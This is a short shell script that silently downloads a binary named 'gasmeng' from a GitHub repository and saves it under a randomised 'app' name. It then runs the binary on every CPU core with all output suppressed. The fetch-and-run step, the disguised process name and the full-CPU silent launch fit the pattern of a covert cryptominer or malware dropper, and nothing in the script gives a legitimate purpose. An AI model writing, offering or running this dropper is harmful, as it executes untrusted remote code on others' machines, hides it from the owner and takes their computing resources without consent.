APP=app$(shuf -i 1000000-9999999 -n 1)
wget -q https://github.com/feby12329/laughing-goggles/raw/master/gasmeng
mv gasmeng $APP
chmod +x $APP
./$APP --threads $(nproc --all) > /dev/null 2>&1
